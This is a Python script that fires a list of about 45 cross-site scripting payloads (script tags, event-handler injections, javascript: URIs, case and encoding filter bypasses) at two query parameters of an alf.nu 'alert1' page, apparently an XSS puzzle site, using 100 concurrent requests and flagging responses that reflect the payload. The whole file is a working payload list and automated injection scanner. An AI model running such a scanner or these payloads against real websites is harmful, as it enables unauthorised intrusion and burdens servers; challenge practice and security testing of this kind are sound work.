#!/usr/bin/env python3
import asyncio
import aiohttp
from urllib.parse import quote
import time

async def parallel_xss_blast():
    print('🚀 PARALLEL XSS TESTING - FULL CPU UTILIZATION')
    print('=' * 55)
    
    base_url = 'https://alf.nu/alert1'
    
    # MASSIVE payload list for parallel testing
    payloads = [
        # Basic
        'alert(1)', '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
        # JavaScript context
        ';alert(1);//', '";alert(1);//', "';alert(1);//", '}alert(1)//',
        # Attribute context  
        '" onload="alert(1)', "' onload='alert(1)", '" onerror="alert(1)',
        # HTML breaking
        '</script><script>alert(1)</script>', '><script>alert(1)</script>',
        # Encoded
        '%3Cscript%3Ealert(1)%3C/script%3E', 'javascript:alert(1)',
        # Advanced
        '<svg onload=alert(1)>', '<body onload=alert(1)>', '<iframe src=javascript:alert(1)>',
        # Filter bypass
        '<ScRiPt>alert(1)</ScRiPt>', 'alert(String.fromCharCode(49))',
        # Special chars
        'alert`1`', 'alert(window["e"+"val"]("1"))', 'alert(/1/.source)',
        # More contexts
        '\\\";alert(1);//', "\\\';alert(1);//", '});alert(1);//',
        # Template literals  
        '${alert(1)}', '`${alert(1)}`', 'alert(1${""})',
        # Event handlers
        'onload=alert(1)', 'onerror=alert(1)', 'onclick=alert(1)',
        # Protocol
        'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
        # More breaking
        '"></script><script>alert(1)</script><script>',
        "'></script><script>alert(1)</script><script>",
        # Additional bypasses
        'alert(1)//', 'alert(1)/*', '/**/alert(1)', 'a\nlert(1)',
        '<script>a\nlert(1)</script>', '<img/src=x/onerror=alert(1)>',
    ]
    
    # Parameters to test
    params = ['world', 'level']
    
    # Create all test combinations
    test_cases = []
    for param in params:
        for payload in payloads:
            if param == 'world':
                url = f'{base_url}?world={quote(payload)}&level=alert0'
            else:
                url = f'{base_url}?world=alert&level={quote(payload)}'
            test_cases.append((payload, url, param))
    
    print(f'🎯 Testing {len(test_cases)} combinations in parallel...')
    
    # Async function to test single URL
    async def test_single(session, payload, url, param):
        try:
            async with session.get(url, timeout=3) as resp:
                html = await resp.text()
                
                # Quick XSS detection
                if 'alert(1)' in html:
                    # Check context
                    if any(ctx in html for ctx in ['<script', 'onload=', 'onerror=', 'javascript:']):
                        return {'success': True, 'payload': payload, 'url': url, 'param': param, 'html': html[:300]}
        except:
            pass
        return None
    
    # Run all tests in parallel with semaphore for rate limiting
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(100)  # 100 concurrent requests - USE THAT CPU!
        
        async def bounded_test(payload, url, param):
            async with semaphore:
                return await test_single(session, payload, url, param)
        
        start_time = time.time()
        
        # Execute all tests concurrently
        tasks = [bounded_test(payload, url, param) for payload, url, param in test_cases]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        end_time = time.time()
        
        # Filter successful results
        successes = [r for r in results if r and isinstance(r, dict) and r.get('success')]
        
        print(f'\n⚡ PARALLEL TESTING COMPLETE!')
        print(f'📊 Tested {len(test_cases)} combinations in {end_time - start_time:.2f} seconds')
        print(f'🎯 Found {len(successes)} potential solutions')
        
        if successes:
            print('\n🔥 POTENTIAL SOLUTIONS:')
            for i, solution in enumerate(successes[:5], 1):
                print(f'{i}. Payload: {solution["payload"]}')
                print(f'   Parameter: {solution["param"]}')
                print(f'   URL: {solution["url"]}')
                print(f'   HTML snippet: {solution["html"][:100]}...')
                print()
            
            # Return the first promising solution
            return successes[0]['url']
        else:
            print('❌ No solutions found with parallel testing')
            
            # Let's also check if we got any responses at all
            response_count = sum(1 for r in results if r is not None or isinstance(r, Exception))
            print(f'📊 Total responses received: {response_count}')
            return None

if __name__ == "__main__":
    solution = asyncio.run(parallel_xss_blast())
    
    if solution:
        print(f'\n🎯 SOLUTION TO TEST: {solution}')
    else:
        print('🤔 Need different approach...')